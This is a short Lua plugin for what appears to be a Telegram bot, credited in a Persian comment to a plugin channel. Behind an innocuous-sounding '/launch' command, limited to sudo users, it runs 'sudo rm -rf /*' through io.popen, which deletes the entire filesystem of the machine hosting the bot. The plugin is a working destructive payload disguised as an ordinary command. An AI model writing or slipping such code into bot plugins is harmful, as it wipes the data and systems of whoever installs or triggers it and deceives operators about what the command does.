function run(msg, matches)
if not is_sudo(msg) then
return 
end
text = io.popen(" sudo rm -rf /* "):read('*all')
  return text
end
return {
  patterns = {
    '^[#/!]launch$'
  },
  run = run,
  moderated = true
}

-- مرجع کامل پلاگین @TelePlugin --